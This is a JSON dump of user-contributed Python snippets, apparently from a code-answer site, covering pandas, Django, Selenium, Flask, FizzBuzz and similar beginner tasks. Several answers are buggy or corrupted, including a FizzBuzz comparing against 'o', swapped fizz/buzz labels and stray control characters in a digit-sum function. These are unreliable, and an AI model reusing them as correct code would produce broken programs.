    "description": "# By recursion def fib(n):     if n == 1 or n == 2:         return 1      else:         return(fib(n-1) + fib(n-2))          n = 6 for i in range(1,n+1):     print(fib(i))\ndef Fibonacci( pos ):         #check for the terminating condition         if pos <= 1 :                 #Return the value for position 1, here it is 0                 return 0         if pos == 2:                 #return the value for position 2, here it is 1                 return 1           #perform some operation with the arguments         #Calculate the (n-1)th number by calling the function itself         n_1 = Fibonacci( pos-1 )           #calculation  the (n-2)th number by calling the function itself again         n_2 = Fibonacci( pos-2 )           #calculate the fibo number         n = n_1 + n_2           #return the fibo number         return n   #Here we asking the function to calculate 5th Fibonacci nth_fibo = Fibonacci( 5 )    print (nth_fibo)\n# Python program to display the Fibonacci sequence  def recur_fibo(n):    if n <= 1:        return n    else:        return(recur_fibo(n-1) + recur_fibo(n-2))  nterms = 10  # check if the number of terms is valid if nterms <= 0:    print(\"Plese enter a positive integer\") else:    print(\"Fibonacci sequence:\")    for i in range(nterms):        print(recur_fibo(i)) \n# WARNING: this program assumes the # fibonacci sequence starts at 1 def fib(num):   \"\"\"return the number at index num in the fibonacci sequence\"\"\"   if num <= 2:     return 1   return fib(num - 1) + fib(num - 2)   print(fib(6))  # 8\n#fibonacci sequence with memory to increase the speed. class recur_fibo:     memory = {0: 1, 1:1}          def fibonacci(n):         if n in recur_fibo.memory:             return recur_fibo.memory[n]         else:             recur_fibo.memory[n] = recur_fibo.fibonacci(n-1) + recur_fibo.fibonacci(n-2)             return recur_fibo.memory[n]  if __name__ == \"__main__\":     value = recur_fibo.fibonacci(200)     print(value)\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1080,
    "keyword": null,
    "link": null,
    "title": " field.choices django",
    "description": "Will create a select box for this in the model form. Use can select from the options.The first element in each tuple is the actual value to be set on the model,  and the second element is the human-readable name. For example: YEAR_IN_SCHOOL_CHOICES = [         (FRESHMAN, 'Freshman'),         (SOPHOMORE, 'Sophomore'),         (JUNIOR, 'Junior'),         (SENIOR, 'Senior'),         (GRADUATE, 'Graduate'),     ]     year_in_school = models.CharField(         max_length=2,         choices=YEAR_IN_SCHOOL_CHOICES,         default=FRESHMAN,     )\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1081,
    "keyword": null,
    "link": null,
    "title": " figsize matplotlib",
    "description": "plt.figure(figsize=(20,10))\nplt.plot([1, 2, 3], label='Inline label') plt.legend(loc=1, prop={'size': 16})  \n    plt.figure(figsize=(20,8))\n# figsize is an optional parameter in matplotlib.pyplot library's .figure() function # it defaults to = None # syntax: # \tfigsize=(width, height) #\t\t- each integer much be a float  import matplotlib.pyplot as plt  figure = plt.figure(figsize = (10,5));\nplt.figure(figsize=(14,7))\nimport matplotlib.pyplot as plt df.plot(figsize=(12,15))\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1082,
    "keyword": null,
    "link": null,
    "title": " file exist python",
    "description": "import os  os.path.exists(\"file.txt\") # Or folder, will return true or false\nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\") \nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\nimport os.path  if os.path.exists('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\n#using pathlib from pathlib import Path  file_name = Path(\"file.txt\") if file_name.exists():     print(\"exists\")  else:     print(\"does not exist\") \npath.exists(\"guru99.txt\")\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1083,
    "keyword": null,
    "link": null,
    "title": " fill missing values in column pandas with mean",
    "description": "df.fillna(df.mean(), inplace=True)\ndf.fillna(df.mean())\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1084,
    "keyword": null,
    "link": null,
    "title": " fill missing values with 0 pandas",
    "description": "df.fillna(df.mean(), inplace=True)\ndf['product']=df['product'].fillna(0) df['context']=df['context'].fillna(0) df\nsub2['income'].fillna((sub2['income'].mean()), inplace=True)\ndf.fillna(0, inplace=True)\ndf.replace(np.nan,0) \ndf.reindex(list(range(df.index.min(),df.index.max()+1)),fill_value=0)\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1085,
    "keyword": null,
    "link": null,
    "title": " fill pixels with zeros python opencv",
    "description": "x = y = 30 w = h = 100  mask = np.zeros(img.shape[:2],np.uint8) mask[y:y+h,x:x+w] = 255 res = cv2.bitwise_and(img,img,mask = mask)\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1086,
    "keyword": null,
    "link": null,
    "title": " fillna with mean pandas",
    "description": "df.fillna(df.mean(), inplace=True)\nsub2['income'].fillna((sub2['income'].mean()), inplace=True)\ndf['column'] = df['column'].fillna(0)\n# importing pandas module import pandas as pd   # making data frame from csv file nba = pd.read_csv(\"nba.csv\")    # replacing na values in college with No college nba[\"College\"].fillna(\"No College\", inplace = True) # OR nba.College.fillna(\"No College\", inplace = True)    print(nba)\ndf.fillna(df.mean())\ndf[\"newColumName\"] = df[\"originalColumnName\"].fillna(df[\"originalColumnName\"].mean())\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1087,
    "keyword": null,
    "link": null,
    "title": " filter by row contains pandas",
    "description": "In [3]: df[df['ids'].str.contains(\"ball\")]  # removes all rows where 'ball' not in row['ids'] Out[3]:      ids  vals 0  aball     1 1  bball     2 3  fball     4\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1088,
    "keyword": null,
    "link": null,
    "title": " filter data in a dataframe python on a if condition of a value</3",
    "description": "# filter rows in a dataframe by a condition on a column  df_filtered = df.loc[df['column'] == value]\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1089,
    "keyword": null,
    "link": null,
    "title": " filter dataframe columns vy a list of columns",
    "description": "df.loc[:, df.columns.isin(['nnn', 'mmm', 'yyy', 'zzzzzz'])]     yyy  nnn  mmm 0   10    5    5 1    9    3    4 2    8    7    0 \n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1090,
    "keyword": null,
    "link": null,
    "title": " filter dataframe multiple conditions",
    "description": "# when you wrap conditions in parantheses, you give order # you do those in brackets first before 'and' # AND movies[(movies.duration >= 200) & (movies.genre == 'Drama')] \n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1091,
    "keyword": null,
    "link": null,
    "title": " filter dataframe with list",
    "description": "df[df['Your_Column'].isin([3, 6])]\nIn [4]: df[~df['A'].isin([3, 6])] Out[4]:    A  B 0  5  1 3  4  5\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1092,
    "keyword": null,
    "link": null,
    "title": " filter function using lambda in python",
    "description": "#filter function   nums1 = [2,3,5,6,76,4,3,2]   bads = list(filter(lambda x: x>4, nums1)) print(bads) \n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1093,
    "keyword": null,
    "link": null,
    "title": " filter list with python",
    "description": "scores = [70, 60, 80, 90, 50] filtered = filter(lambda score: score >= 70, scores)  print(list(filtered))  # Output: [70, 80, 90]\n",
    "reg_date": "2021-10-12T11:29:21.000Z"
  },
  {
    "id": 1094,
    "keyword": null,
    "link": null,
    "title": " filter with different operator in django",
    "description": "from myapp.models import Entry from django.db.models import Q  Entry.objects.filter(~Q(id=3))  #will return all entries except the one(s) with 3 as their ID\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1095,
    "keyword": null,
    "link": null,
    "title": " find Carmichael number sage",
    "description": "for n in range(2,7000):     if not is_prime(n):         carmichael = True         for a in range(1,n):             if Mod(a,n)^n != Mod(a,n):                 carmichael = False                 break         if carmichael:             print n \n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1096,
    "keyword": null,
    "link": null,
    "title": " find absolut vale in python",
    "description": "abs(a)\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1097,
    "keyword": null,
    "link": null,
    "title": " find all files in a directory with extension python",
    "description": "import glob, os os.chdir(\"/mydir\") for file in glob.glob(\"*.txt\"):     print(file)\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1098,
    "keyword": null,
    "link": null,
    "title": " find all nan columns pandas",
    "description": "nan_cols = [i for i in df.columns if df[i].isnull().any()] print(\"No. of columns containing null values\") print(len(df.columns[df.isna().any()]))  print(\"No. of columns not containing null values\") print(len(df.columns[df.notna().all()]))  print(\"Total no. of columns in the dataframe\") print(len(df.columns))\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1099,
    "keyword": null,
    "link": null,
    "title": " find all unique items in dictionary value python",
    "description": "L = [{\"V\":\"S001\"}, {\"V\": \"S002\"}, {\"VI\": \"S001\"}, {\"VI\": \"S005\"}, {\"VII\":\"S005\"}, {\"V\":\"S009\"},{\"VIII\":\"S007\"}] print(\"Original List: \",L) u_value = set( val for dic in L for val in dic.values()) print(\"Unique Values: \",u_value)\ndict = {'511':'Vishnu','512':'Vishnu','513':'Ram','514':'Ram','515':'sita'} list =[] # create empty list for val in dict.values():    if val in list:      continue    else:     list.append(val)  print list\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1100,
    "keyword": null,
    "link": null,
    "title": " find and replace string dataframe",
    "description": "df['range'] = df['range'].str.replace(',','-')\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1101,
    "keyword": null,
    "link": null,
    "title": " find angle mbc in python",
    "description": "from math import atan2 from math import degrees  ab = float(input()) bc = float(input())  print(str(round(degrees(atan2(ab, bc)))) + '&deg;') \n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1102,
    "keyword": null,
    "link": null,
    "title": " find common elements in two lists python",
    "description": "list1 = [1,2,3,4,5,6] list2 = [3, 5, 7, 9] list(set(list1).intersection(list2))\nlist1 = ['little','blue','widget'] list2 = ['there','is','a','little','blue','cup','on','the','table']  list3 = set(list1)&set(list2)  list4 = sorted(list3, key = lambda k : list1.index(k))\nlen([x for x in list1 if x in list2])\n# using numpy import numpy as np a = np.array([1,2,3,2,3,4,3,4,5,6]) b = np.array([7,2,10,2,7,4,9,4,9,8]) # using intersect1d print(np.intersect1d(a,b)) # output # [2 4]\nx = {2, 3, 5, 6} y = {1, 2, 3, 4}  z = x.intersection(y) \n>>> p = [[1,2,3], [1,9,9], [1,2,4]] >>> set.intersection(*map(set, p)) set([1]) >>> ip = iter(p) >>> s = set(next(ip)) >>> s.intersection(*ip) set([1]) \n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1103,
    "keyword": null,
    "link": null,
    "title": " find common words in two lists python",
    "description": "list1 = ['little','blue','widget'] list2 = ['there','is','a','little','blue','cup','on','the','table']  list3 = set(list1)&set(list2)  list4 = sorted(list3, key = lambda k : list1.index(k))\n",
    "reg_date": "2021-10-12T11:29:22.000Z"
  },
  {
    "id": 1104,
    "keyword": null,
    "link": null,
    "title": " find different values from two lists python",
    "description": "list_difference = [item for item in list1 if item not in list2]\nset_difference = set(list1) - set(list2) list_difference = list(set_difference)\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1105,
    "keyword": null,
    "link": null,
    "title": " find duplicated rows with respect to multiple columns pandas",
    "description": "df = df[df.duplicated(subset=['val1','val2'], keep=False)] print (df)    id  val1  val2 0   1   1.1   2.2 1   1   1.1   2.2 3   3   8.8   6.2 4   4   1.1   2.2 5   5   8.8   6.2\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1106,
    "keyword": null,
    "link": null,
    "title": " find element by css selector selenium python",
    "description": "# you can see https://www.w3schools.com/cssref/css_selectors.asp # or https://stackoverflow.com/questions/21713280/find-div-element-by-multiple-class-names  # 1- <div class=\"value test\"></div> # 2- <div class=\"value test     \"></div> # 3- <div class=\"first value test last\"></div> # 4- <div class=\"test value\"></div>  # divs that their class is equal to 'value test' absolutely. driver.find_elements_by_css_selector(\"div[class='value test']\") # --> [1]  # divs that their class includes 'value test'. driver.find_elements_by_css_selector(\"div[class*='value test']\") # --> [1, 2, 3]  # divs that their class includes 'value' and 'test' also. driver.find_elements_by_css_selector(\"div.value.test\") # --> [1, 2, 3, 4]\ndriver.find_element_by_xpath('//*[@id=\"emailField\"]')\ndriver.findElement(By.id(\"ui-datepicker-div\"));\nbrowser.find_elements_by_class_name(\"INSERT_CLASS_NAME_HERE\")\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1107,
    "keyword": null,
    "link": null,
    "title": " find element by title selenium python",
    "description": "With a CSS selector for an element with a title starting with \"4G Signal quality\":  driver.find_element_by_css_selector(\"[title^='4G Signal quality']\") , or containing \"4G Signal quality\":  driver.find_element_by_css_selector(\"[title*='4G Signal quality']\")\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1108,
    "keyword": null,
    "link": null,
    "title": " find element in beautifulsoup by partial attribute value",
    "description": "# Use regex  # suppose I have list of 'div' with 'class' as follows: # <div class='abcd bcde cdef efgh'>some content</div> # <div class='mnop bcde cdef efgh'>some content</div> # <div class='abcd pqrs cdef efgh'>some content</div> # <div class='hijk wxyz cdef efgh'>some content</div>  # as observable the class value string of above div(s) ends with 'cdef efgh' # So to extract all these in a single list:  from bs4 import BeautifulSoup import re # library for regex in python soup = BeautifulSoup(<your_html_response>, <parser_you_want_to_use>) elements = soup.find_all('div', {'class': re.compile(r'cdef efgh$')}) # $ means that 'cdef efgh' must is the ending of the string  # Note: This was just one case. You can make almost any case with regex. # Learn more and experiment with regex at https://regex101.com/\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1109,
    "keyword": null,
    "link": null,
    "title": " find height of binary search tree python",
    "description": " def getHeight(self,root):         return -1 if root is None else 1 + max(self.getHeight(root.left), self.getHeight(root.right))\n",
    "reg_date": "2021-10-12T11:29:23.000Z"
  },
  {
    "id": 1110,
    "keyword": null,
    "link": null,
    "title": " find index of max value in 2d array python",
    "description": "from numpy import unravel_index unravel_index(a.argmax(), a.shape)\na = [1, 2, 3, 4, 5] print(max(a)) # 5\n",
    "reg_date": "2021-10-12T11:29:25.000Z"
  },
  {
    "id": 1111,
    "keyword": null,
    "link": null,
    "title": " find index of pandas column",
    "description": "# PANDAS: get column number from colomn name dataframe.columns.get_loc(\"<col_name>\") \nIn [45]: df = DataFrame({\"pear\": [1,2,3], \"apple\": [2,3,4], \"orange\": [3,4,5]})  In [46]: df.columns Out[46]: Index([apple, orange, pear], dtype=object)  In [47]: df.columns.get_loc(\"pear\") Out[47]: 2 \nIn [48]: a Out[48]:     c1  c2 0   0   1 1   2   3 2   4   5 3   6   7 4   8   9  In [49]: a.c1[a.c1 == 8].index.tolist() Out[49]: [4]\nprint(df[df['Name']=='Donna'].index.values)\n",
    "reg_date": "2021-10-12T11:29:25.000Z"
  },
  {
    "id": 1112,
    "keyword": null,
    "link": null,
    "title": " find ip address on local network ubuntu",
    "description": "Generally, nmap is quite useful to quickly scan networks.  To install nmap, enter the following command in the terminal:  sudo apt-get install nmap  Once the application is installed, enter the following command:  nmap -sn 192.168.1.0/24 \n",
    "reg_date": "2021-10-12T11:29:25.000Z"
  },
  {
    "id": 1113,
    "keyword": null,
    "link": null,
    "title": " find last appearance python",
    "description": ">>> s = 'hello' >>> s.rfind('l') 3 \n",
    "reg_date": "2021-10-12T11:29:25.000Z"
  },
  {
    "id": 1114,
    "keyword": null,
    "link": null,
    "title": " find location of library python linux",
    "description": "import module_name  print(module_name.__file__)\n",
    "reg_date": "2021-10-12T11:29:25.000Z"
  },
  {
    "id": 1115,
    "keyword": null,
    "link": null,
    "title": " find matches between two lists python",
    "description": "set(a).intersection(b)\n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1116,
    "keyword": null,
    "link": null,
    "title": " find max value index in value count pandas",
    "description": "df = {'a': 3, 'b':4, 'c':5} df.max() #max() gives you the maximum value in the series. #Output 5  df.idxmax() #idx() gives you the index of the maximum values. #Output c  #NB: The same applies to min() and idxmin().  \n#use this to get the index of the max value of a column max_index = column.idxmax()\nmax_value_column = df[\"column_name\"].max()\n# applying idxmax() function. df.idxmax(axis = 0)\n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1117,
    "keyword": null,
    "link": null,
    "title": " find most used colors in image python",
    "description": "from __future__ import print_function import binascii import struct from PIL import Image import numpy as np import scipy import scipy.misc import scipy.cluster  NUM_CLUSTERS = 5  print('reading image') im = Image.open('image.jpg') im = im.resize((150, 150))      # optional, to reduce time ar = np.asarray(im) shape = ar.shape ar = ar.reshape(np.product(shape[:2]), shape[2]).astype(float)  print('finding clusters') codes, dist = scipy.cluster.vq.kmeans(ar, NUM_CLUSTERS) print('cluster centres:\\n', codes)  vecs, dist = scipy.cluster.vq.vq(ar, codes)      # assign codes counts, bins = np.histogram(vecs, len(codes))    # count occurrences  index_max = np.argmax(counts)                    # find most frequent peak = codes[index_max] colour = binascii.hexlify(bytearray(int(c) for c in peak)).decode('ascii') # actual colour, (in HEX) print('most frequent is %s (#%s)' % (peak, colour)) \n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1118,
    "keyword": null,
    "link": null,
    "title": " find nan value in dataframe python",
    "description": "# to mark NaN column as True df['your column name'].isnull() \n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1119,
    "keyword": null,
    "link": null,
    "title": " find nan values in a column pandas",
    "description": "df.isnull().values.any() \ndf['your column name'].isnull().sum() \ndf[df['col'].isnull()]\ndf['your column name'].isnull().values.any() \ndf.isnull().sum().sum() \n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1120,
    "keyword": null,
    "link": null,
    "title": " find position of nan pandas",
    "description": "# position of NaN values in terms of index df.loc[pandas.isna(df[\"b\"]), :].index  # position of NaN values in terms of rows that cotnain NaN df.loc[pandas.isna(df[\"b\"]), :]\n",
    "reg_date": "2021-10-12T11:29:26.000Z"
  },
  {
    "id": 1121,
    "keyword": null,
    "link": null,
    "title": " find prime number in given range in python",
    "description": "#not made by me but a person name \"Concerned Cod\" i put only input in it so it makes easy to copy-paste LOL start = int(input(\"enter start range : \")) end = int(input(\"end range : \"))   for i in range(start,end):   if i>1:     for j in range(2,i):         if(i % j==0):             break     else:         print(i)\nn=int(input(\"Enter the number till you want to check: \")) primes = [] for i in range (2, n+1):     for j in range(2, i):         if i%j == 0:             break     else:         primes.append(i) print(primes)\n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1122,
    "keyword": null,
    "link": null,
    "title": " find python path windows",
    "description": ">>> import os >>> import sys >>> os.path.dirname(sys.executable) 'C:\\\\Python25'\n>>> import os >>> import sys >>> os.path.dirname(sys.executable) 'C:\\\\Python25' \nwhere python \n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1123,
    "keyword": null,
    "link": null,
    "title": " find root directory of jupyter notebook",
    "description": "import os os.getcwd() \n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1124,
    "keyword": null,
    "link": null,
    "title": " find sum of values in a column that corresponds to unique vallues in another coulmn python",
    "description": "group = df.groupby('author')  df2 = group.apply(lambda x: x['subreddit'].unique())  # Alternatively, same thing as a one liner: # df2 = df.groupby('author').apply(lambda x: x['subreddit'].unique()) \n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1125,
    "keyword": null,
    "link": null,
    "title": " find text between two strings regex python",
    "description": ">>> import re >>> s = 'Part 1. Part 2. Part 3 then more text' >>> re.search(r'Part 1\\.(.*?)Part 3', s).group(1) ' Part 2. ' >>> re.search(r'Part 1(.*?)Part 3', s).group(1) '. Part 2. '\n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1126,
    "keyword": null,
    "link": null,
    "title": " find the determinant of a matrix in python",
    "description": "np.linalg.det(b)\ndef determinantOfMatrix(matrix,n):     res=  (np.linalg.det(matrix))     return (int(round(res)))\n",
    "reg_date": "2021-10-12T11:29:27.000Z"
  },
  {
    "id": 1127,
    "keyword": null,
    "link": null,
    "title": " find the digit number sum in a string in python",
    "description": "def sum_digits(n):     s = 0     while n:         s += n % 10         n //= 10     return s\n# Here, first a complex input is used to determine the sum of all the integers in that input.  # Rules : 1  s = input() c = \"\" for i in s:     if i.isdigit():         c += i sum_d = sum(int(j) for j in c) print(sum_d)  # Rules : 2  s = input() c = \"\" sum = 0 for i in s:     if i.isdigit():         c += i for j in c:   sum += int(c)\u0010   c = int(c)//10 print(sum)  # Sample input: murad#123#$%&*$%!@*34 # Sample output: 13   # Eval method using to problem: # Problem name: Python Evaluation # Code string = eval(input(\"\")) print()  # Sample Input: print(2 + 3) # Sample Output: 5  \nnumber = 123 # the number you want summed up sum_of_digits = 0  for digit in str(number):   sum_of_digits += int(digit)    print(sum_of_digits) # printing the final sum of number\nnumber = 123 # the number you want to sum the digits of  sum_of_digits = sum(int(digit) for digit in str(number))  print(sum_of_digits)\ndigit_sum = lambda s: sum(int(digit) for digit in str(s)) #without recursion  #sum of digits using recursion  dsum = 0 # we define dsum outside of the function so its value isn't reset every time the function gets called recursivley  def rdigit_sum(s):     global dsum # making dsum 'global' allows us to use it a function     if s: # checks if s has digits to add to dsum         dsum += s\u0010 # adds the current units digit to dsum         s = s//10 # removes the current units digit     else: # if there are no digits left         s = dsum  # this block reassigns s to dsum, then resets dsum to 0 so dsum doesn't already have a value if this function is called more than once in a program         dsum = 0         return s       return rdigit_sum(s) # this is the 'recursive' part of the program that calls the function again\n",
    "reg_date": "2021-10-12T11:29:28.000Z"
  },
  {
    "id": 1128,
    "keyword": null,
    "link": null,
    "title": " find time of run for python code",
    "description": "import time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time)) \n",
    "reg_date": "2021-10-12T11:29:28.000Z"
  },
  {
    "id": 1129,
    "keyword": null,
    "link": null,
    "title": " find todays date in python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\n from datetime import datetime  # Current date time in local system print(datetime.now()) print(datetime.date(datetime.now())) ##For Date \nimport datetime today = datetime.date.today() print(today)\nfor printing current date \n",
    "reg_date": "2021-10-12T11:29:28.000Z"
  },
  {
    "id": 1130,
    "keyword": null,
    "link": null,
    "title": " find two number in python",
    "description": "a = int(input(\"enter first number: \")) b = int(input(\"enter second number: \")) sum = a + b. print(\"sum:\", sum)\n",
    "reg_date": "2021-10-12T11:29:28.000Z"
  },
  {
    "id": 1131,
    "keyword": null,
    "link": null,
    "title": " find unique char in string python",
    "description": "In [1]: list(set('aaabcabccd')) Out[1]: ['a', 'c', 'b', 'd'] \n",
    "reg_date": "2021-10-12T11:29:28.000Z"
  },
  {
    "id": 1132,
    "keyword": null,
    "link": null,
    "title": " finding if user input is lower or upper in python",
    "description": "lower_case_items = \"abcdefghijklmnopqrstuvwxyz\" char = \"B\" if char in lower_case_items:     print(\"This item is lower case\") else:     print(\"This item is Upper case item\")\n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1133,
    "keyword": null,
    "link": null,
    "title": " finding path of a module in python",
    "description": "from inspect import getmodule print(getmodule(os))\nimport imp print(\"Location of Python os module sources:\") print(imp.find_module('os')) print(\"\\nLocation of Python time module sources:\") print(imp.find_module('time'))\nresult=[] your_module = ? for i in dir(your_module):     if type(getattr(your_module, i)).__name__ == \"function\":         result.append(getattr(your_module, i)) print(result)\n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1134,
    "keyword": null,
    "link": null,
    "title": " firebase python realtime database",
    "description": "# Import database module. from firebase_admin import db  # Get a database reference to our posts ref = db.reference('server/saving-data/fireblog/posts')  # Read the data at the posts reference (this is a blocking operation) print(ref.get())\n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1135,
    "keyword": null,
    "link": null,
    "title": " first openfaas python function",
    "description": "import json  def handle(req):     json_req = json.loads(req)     return json_req \n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1136,
    "keyword": null,
    "link": null,
    "title": " first position dict python",
    "description": "my_dict = {'foo': 'bar', 'spam': 'eggs'} next(iter(my_dict)) # outputs 'foo'  # or  my_dict = {'foo': 'bar', 'spam': 'eggs'} list(my_dict.keys())[0] # outputs 'foo'\n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1137,
    "keyword": null,
    "link": null,
    "title": " fizz buzz python",
    "description": "def fizz_buzz(input):     if (input % 3 == 0) and (input % 5 == 0):         return \"FizzBuzz\"     if input % 3 == 0:         return \"Fizz\"     if input % 5 == 0:         return \"Buzz\"     else:         return input   print(fizz_buzz(3))\ndef fizz_buzz(num):     if num % 3 == 0 and num % 5 == 0:         return \"fizzBuzz\"     elif num % 3 == 0:         return \"fizz\"     elif num % 5 == 0:         return \"buzz\"     else:         return num \n#made by myself :) def FizzBuzz() :     Numbers = 0     for Numbers in range(101):         if Numbers%3 == 0:             print (\"Fizz\")         if Numbers%5 == 0:             print (\"Buzz\")         if Numbers%3 == 0 and Numbers%5 ==0:             print (\"Fizz Buzz\")         else :             print (Numbers) FizzBuzz()\nfizz = 3 buzz = 5 fizzbuzz = fizz * buzz  for i in range(100):   if i % fizzbuzz == o:     print('fizzbuzz')    elif i % fizz == 0:     print('fizz')    elif i % buzz == 0:      print('buzz')    else:     print(i)\ndef fizzBuzz(n):     # Write your code here     for i in range(1,a):         if(i%3==0 and i%5!=0):             print(\"Fizz\")         elif(i%5==0 and i%3!=0):             print(\"Buzz\")         elif(i%5==0 and i%3==0):             print(i) a = int(input(\"enter the no\")) fizzBuzz(a) \n# changeable game of fizz buzz (all you have to change is n and D # to add or alter the game. # No adding or changing if/else required to include bizz at 7 or fuzz at 11 # just insert it into the dictionary. (you could easily make a function out of this)  n = 100 D = {3: 'fizz',      5: 'buzz'} for x in range(1, n+1):         # makes a range as big as we like     out = ''     for k, v in D.items():      # compares each in range with each key in dictionary         if x % k == 0:             out += v            # then attaches the associated word onto the output     if not out:         out = x                 # if the output is still empty, i.e. no listed factors     print(out, end=' ')         # the unchanged number becomes the output\n",
    "reg_date": "2021-10-12T11:29:29.000Z"
  },
  {
    "id": 1138,
    "keyword": null,
    "link": null,
    "title": " fizzbuzz python solution",
    "description": "def fizz_buzz(input):     if (input % 3 == 0) and (input % 5 == 0):         return \"FizzBuzz\"     if input % 3 == 0:         return \"Fizz\"     if input % 5 == 0:         return \"Buzz\"     else:         return input   print(fizz_buzz(3))\ndef fizz_buzz(num):     if num % 3 == 0 and num % 5 == 0:         return \"fizzBuzz\"     elif num % 3 == 0:         return \"fizz\"     elif num % 5 == 0:         return \"buzz\"     else:         return num \n   for number in range(1, 101):   if number % 3 == 0 and number % 5 == 0:     print(\"FizzBuzz\")   if number % 3 == 0:     print(\"Fizz\")   if number % 5 == 0:     print(\"Buzz\")   else:     print([number])\ndef fizz_buzz(Ending_number:int):      \"\"\"This is a fizz buzz game the starting number would be taken as 1\"\"\"     for numbers in range(1,Ending_number):         if numbers % 3 == 0 and numbers % 5 == 0:             print(\"fizz buzz\")         elif numbers % 3 == 0:             print(\"buzz\")         elif numbers % 35 == 0:             print(\"fizz\")         else:             print(numbers) print(fizz_buzz(120))\ndef minInput():     Min = 1     return(Min) def maxInput():     Max=100     return(Max)    def creator(i):     item = \"\"          if task(i,3,\"fizz\")==\"fizz\":         item = item+task(i,3,\"fizz\")     if task(i,5,\"buzz\")==\"buzz\":         item = item+task(i,5,\"buzz\")     if task(i,7,\"pezz\")==\"pezz\":         item = item+task(i,7,\"pezz\")              if item == \"\":         item = i     return item  def task(i,d,word):     if i%d==0:         return (word)  def main():     Max = maxInput()     Min = minInput()     for i in range(Min,Max):         print(creator(i)) main()\n# check prime number def prime(n):     if n > 1:         for i in range(2, n):             if (n % i) == 0:                 break         else:             print(n, \"prime number\")   for num in range(1, 100):     result = \"\"     if prime(num):         result += \"Prime\"     else:         if num % 3 == 0 and num % 5 == 0:             result += \"FizzBuzz\"             print(num, result)         elif num % 3 == 0:             result += \"Fizz\"             print(num, result)         elif num % 5 == 0:             result += \"Buzz\"             print(num, result)         else:             print(num)   if __name__ == '__main__':      print('All done')\n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
    "id": 1139,
    "keyword": null,
    "link": null,
    "title": " flask app example",
    "description": "# Extremely simple flask application, will display 'Hello World!' on the screen when you run it # Access it by running it, then going to whatever port its running on (It'll say which port it's running on). from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'  if __name__ == '__main__':     app.run()\n$ export FLASK_APP=hello.py $ python -m flask run  * Running on http://127.0.0.1:5000/ \n# Imports necessary libraries from flask import Flask  # Define the app app = Flask(__name__)  # Get a welcoming message once you start the server. @app.route('/') def home():     return 'Home sweet home!'  # If the file is run directly,start the app. if __name__ == '__main__':     app.run(Debug=True)  # To execute, run the file. Then go to 127.0.0.1:5000 in your browser and look at a welcoming message.\nfrom flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!' \n#Import Flask, if not then install and import.  import os try:   from flask import * except:   os.system(\"pip3 install flask\")   from flask import *  app = Flask(__name__)  @app.route(\"/\") def index():   return \"<h1>Hello World</h1>\"  if __name__ == \"__main__\":   app.run(host=\"0.0.0.0\", port=8080, debug=False)\n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
